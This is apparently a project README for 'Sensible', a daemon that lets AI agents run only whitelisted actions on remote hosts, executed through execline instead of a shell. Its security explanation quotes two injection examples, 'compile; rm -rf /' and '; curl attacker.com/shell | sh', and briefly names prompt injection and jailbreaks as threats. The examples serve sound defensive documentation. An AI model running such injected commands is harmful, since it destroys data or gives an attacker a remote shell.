# Sensible

**Remote execution for AI agents — safe by default.**

Sensible gives AI the same capabilities your SSH/Ansible already has, but with guardrails that make it safe to delegate.

## The Problem

Software houses have SSH/Ansible access to client servers. They're now being pressured to let AI automate tasks (compile, deploy, restart, update). But raw SSH access for AI is a catastrophe waiting to happen:

- **Prompt injection** — malicious input tricks AI into executing attacker commands
- **Jailbroken AI** — safety guardrails bypassed
- **Too much power** — AI can do anything, not just the intended task

> You wouldn't give a junior dev root SSH. Treat AI the same way.

## The Solution

```
ISV has SSH to clients     →     ISV has Sensible to clients
     ↓                              ↓
  Full access                    Safe access
  Everything                     Approved actions only
  Audit logs                    JSON audit trail
```

**Sensible = SSH/Ansible access, AI-safe edition**

Same actions. Same hosts. But with guardrails that make AI delegation responsible.

## How It Works

```
┌─────────────┐     HTTP/JSON      ┌──────────────────┐     execline      ┌─────────┐
│  AI Agent   │ ──────────────────► │   sensibled       │ ─────────────────► │ actions │
│             │ ◄────────────────── │   (daemon)       │ ◄───────────────── │  dir    │
└─────────────┘    JSON response    └──────────────────┘    stdout/stderr    └─────────┘
     │                                       │
     │         API key + whitelist           │
     └─────────────────────────────────────┘
```

1. **Bootstrap** — ISV SSHs to client, installs sensible + API key + whitelist
2. **Runtime** — AI calls sensible over HTTP with API key
3. **Validation** — Action checked against whitelist, args validated
4. **Execution** — execline runs action (not shell, prevents injection)
5. **Response** — JSON with audit trail: stdout, stderr, duration, exit code

## Why execline?

**Shell is fundamentally unsafe for AI execution. The guardrail is execline.**

```bash
# This is a security nightmare:
ai_output="compile; rm -rf /"  # injected via prompt
./run.sh $ai_output            # runs: compile; rm -rf /

# Even "safe" commands are vulnerable:
./build.sh $USER_INPUT        # user_input = "; curl attacker.com/shell | sh"
```

**execline eliminates shell as an attack vector:**

| Shell | execline |
|-------|----------|
| `$VAR` interpolation | `import -env VAR` — explicit, no magic |
| `cmd1; cmd2` chaining | Not possible without explicit `background` |
| `cmd1 && cmd2` | Not an operator — `if` is a builtin |
| `-c "$(cat)"` | `execlineb "$file"` — file never interpreted |

**The guardrail: No shell. No interpretation layer. No injection surface.**

With shell, `$anything` is a potential injection. With execline, the script IS the command. There's no interpretation layer to exploit.

**Even if API key is compromised, whitelist limits actions. Even if whitelist bypassed, execline prevents shell injection.**

## Security Model

```
HTTP Request
    ↓
API Key (Bearer token)
    ↓
Action whitelist
    ↓
Args validation (regex)
    ↓
execline execution ← the guardrail
    ↓
JSON response + audit
```

## API

Works standalone (port) or behind reverse proxy (`/sensible` path).

```bash
# Standalone
curl -X POST https://host:8443/v1/tasks \
  -H "Authorization: Bearer <api-key>" \
  -d '{"request": "compile --target=linux"}'

# Behind nginx at /sensible
curl -X POST https://host/sensible/v1/tasks \
  -H "Authorization: Bearer <api-key>" \
  -d '{"request": "compile --target=linux"}'

# Response
{
  "id": "task-1234",
  "request": "compile --target=linux",
  "status": "success",
  "exit_code": 0,
  "stdout": "Build complete\n",
  "stderr": "",
  "duration_ms": 45230,
  "timestamp": "2026-04-23T17:00:00Z"
}
```

## Installation

### Run

```bash
# Standalone (port)
sensible serve --port 8443

# Behind reverse proxy (/sensible path)
sensible serve --path /sensible
```

### Bootstrap via SSH

```bash
# Build installer
makeself.sh sensible sensible-installer.sh "Sensible" "./sensible install"

# Deploy to clients
sensible deploy --hosts=web1,web2 --ssh-user=root --installer=sensible-installer.sh
```

Deploy:
1. SCP installer to host
2. SSH + run installer (`./sensible-installer.sh --install`)
3. Sensible starts via systemd
4. Returns endpoint + API key

### Runtime

```bash
# Execute
sensible run web1 compile --target=linux

# Check status
sensible status --host web1
```

## Configuration

### Whitelist (`/etc/sensible/whitelist.yaml`)

```yaml
actions:
  - name: compile
    args_schema:
      target: "^(linux|darwin|windows)$"
    timeout: 600
  - name: restart
    timeout: 60
  - name: update
    timeout: 300
```

### API Keys (`/etc/sensible/keys/`)

```
/etc/sensible/keys/
├── isv.pem          # ISV's key
└── ai-agent.pem     # AI's key
```

## Project Structure

```
sensible/
├── cmd/sensible/     # Daemon + CLI
├── pkg/
│   ├── daemon/        # HTTP server
│   ├── deploy/       # SSH bootstrap
│   └── config/       # Config loading
├── actions/          # Built-in actions
├── Makefile
└── README.md
```

## Relationship to Groan

**Groan** — CLI builder (shell scripts → hierarchical CLI)

**Sensible** — Remote execution for Groan CLIs

```
groan compile --target=linux      # Local
sensible run web1 compile         # Remote
```

Sensible executes Groan CLI remotely via execline.

## Relationship to host-actions

**host-actions** — Sensible for containers (file queue + dispatch)

**Sensible** — Sensible for hosts (HTTP + SSH bootstrap)

Both share: execline execution, whitelist hardening, JSON responses, CLI-native for AI.

Transport differs:
- host-actions: volume mount + systemd
- sensible: HTTP + SSH bootstrap

## License

MIT
